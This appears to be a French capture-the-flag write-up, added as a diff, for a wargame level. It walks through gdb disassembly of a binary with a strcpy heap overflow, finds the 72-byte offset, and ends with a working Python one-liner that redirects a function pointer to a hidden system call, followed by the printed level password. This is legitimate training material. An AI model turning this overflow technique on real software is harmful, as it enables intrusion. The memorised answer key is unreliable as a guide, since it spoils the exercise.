@@ -1,0 +1,106 @@
+On a un fichier binaire, qui segfault quand on le lance sans argument, et qui repond Nope quand on met un argument.
+
+En regardant dans gdb, on voit que le main fait appelle deux fois à un malloc, et une fois à un strcopy
+Mais on voit aussi un appel sur *%eax
+(gdb) disas main
+    ...
+    0x0804847f <+3>:	and    $0xfffffff0,%esp
+    0x08048482 <+6>:	sub    $0x20,%esp
+    0x08048485 <+9>:	movl   $0x40,(%esp)
+    0x0804848c <+16>:	call   0x8048350 <malloc@plt>
+    0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+    0x08048495 <+25>:	movl   $0x4,(%esp)
+    0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+    0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+    0x080484a5 <+41>:	mov    $0x8048468,%edx
+    0x080484aa <+46>:	mov    0x18(%esp),%eax
+    0x080484ae <+50>:	mov    %edx,(%eax)
+    0x080484b0 <+52>:	mov    0xc(%ebp),%eax
+    0x080484b3 <+55>:	add    $0x4,%eax
+    0x080484b6 <+58>:	mov    (%eax),%eax
+    0x080484b8 <+60>:	mov    %eax,%edx
+    0x080484ba <+62>:	mov    0x1c(%esp),%eax
+    0x080484be <+66>:	mov    %edx,0x4(%esp)
+    0x080484c2 <+70>:	mov    %eax,(%esp)
+    0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+    0x080484ca <+78>:	mov    0x18(%esp),%eax
+    0x080484ce <+82>:	mov    (%eax),%eax
+    0x080484d0 <+84>:	call   *%eax
+    0x080484d2 <+86>:	leave  
+    0x080484d3 <+87>:	ret 
+    ...
+Allons voir ce qui se cache derriere:
+(gdb) b *0x080484d0  (on met un breakpoint a ce call)
+(gdb) run coucou     (on run avec pour argument coucou)
+Le programme s'arrête au breakpoint et on regarde ce que contient eax:
+(gdb) p $eax
+    $1 = 134513768
+C'est en decimal, on le converti en hexa (8048468) et on demande à quel instruction ça correspond:
+(gdb) x/i 0x8048468
+       0x8048468 <m>:	push   %ebp
+
+l'appel à eax et en fait l'appelle à la première instruction d'une fonction m !
+On voit aussi plus haut dans le main, un mov, un déplacement vers cette meme addresse:
+    0x080484a5 <+41>:	mov    $0x8048468,%edx
+Un des malloc est donc destiné à stocker la fonction m pour pouvoir l'appeler ensuite.
+On vérifie donc les fonctions existante dans le programme:
+(gdb) info functions
+    0x08048454  n
+    0x08048468  m
+    0x0804847c  main
+On y découvre une focntion m mais aussi une fonction n.
+
+(gdb) disas m
+    0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	sub    $0x18,%esp
+   0x0804846e <+6>:	movl   $0x80485d1,(%esp)
+   0x08048475 <+13>:	call   0x8048360 <puts@plt>
+   0x0804847a <+18>:	leave  
+   0x0804847b <+19>:	ret
+(gdb) x/s 0x80485d1
+    0x80485d1:	 "Nope"
+On sait d'ou vient le nope au lancement du programme.
+
+(gdb) disas n
+    0x08048454 <+0>:	push   %ebp
+   0x08048455 <+1>:	mov    %esp,%ebp
+   0x08048457 <+3>:	sub    $0x18,%esp
+   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
+   0x08048461 <+13>:	call   0x8048370 <system@plt>
+   0x08048466 <+18>:	leave  
+   0x08048467 <+19>:	ret 
+(gdb) x/s 0x80485b0
+    0x80485b0:	 "/bin/cat /home/user/level7/.pass"
+
+Et caché dans une fonction n, se trouve un appel system qui appelle directement notre .pass du level7.
+Il faut donc trouver le moyen d'éxecuter la fonction n.
+Or on voit qu'on a strcopy, qui n'est surement pas protégé puisque l'on fait un segfault sans argument.
+EN observant un peu plus, on comprends que l'un des malloc servira au strcpy, qui tentera de copier l'argument donné vers notre allocation.
+(gdb) disas main
+    ...
+   0x080484c2 <+70>:	mov    %eax,(%esp)              => on place "coucou" dans %eax
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>   => les deux argument sont envoyé a strcpy
+    ...
+(gdb)  b *0x080484c5
+(gdb) run coucou
+    Starting program: /home/user/level6/level6 coucou
+    Breakpoint 1, 0x080484c5 in main ()
+(gdb) x/2xw $esp
+    0xbffff700:	0x0804a008	0xbffff901
+(gdb) x/s 0x0804a008
+    0x804a008:	 ""
+(gdb) x/s 0xbffff901
+    0xbffff901:	 "coucou"
+
+
+Cette allocation est de 0x40, c'est a dire 64 octets, on comprends donc qu'on peut facilement reussir à faire un overflow en donnant un trop grand nombre d'octet en argument.
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41346341 in ?? ()
+Le programme segfault a l'addresse 0x41346341 qui correspond au 72e octet.
+Une fois cette overflow réalisé, on se retrouve dans la stack et on peut orienter la suite du programme à executer vers notre fameuse fonction n, dont l'addresse est 0x08048454
+
+donc 
+$ ./level6 $(python -c 'print 72 * "A" + "\x08\x04\x84\x54"[::-1]')
+    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
